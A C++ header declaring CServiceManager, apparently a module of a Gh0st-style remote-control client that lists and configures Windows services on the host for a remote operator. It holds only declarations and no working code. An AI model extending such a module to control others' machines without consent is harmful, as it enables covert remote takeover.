#pragma once
#include "Manager.h"
#include "common.h"
class CServiceManager :
	public CManager
{
public:
	CServiceManager(_CIOCPClient* IOCPClient);
	~CServiceManager();
	VOID CServiceManager::HandleIO(PBYTE BufferData, ULONG BufferLength);
	VOID CServiceManager::SendClientServiceList();
	LPBYTE CServiceManager::GetClientServiceList();
	void CServiceManager::ConfigClientServices(PBYTE BufferData, ULONG BufferLength);
public:
	SC_HANDLE m_ServiceManagerHandle;
};

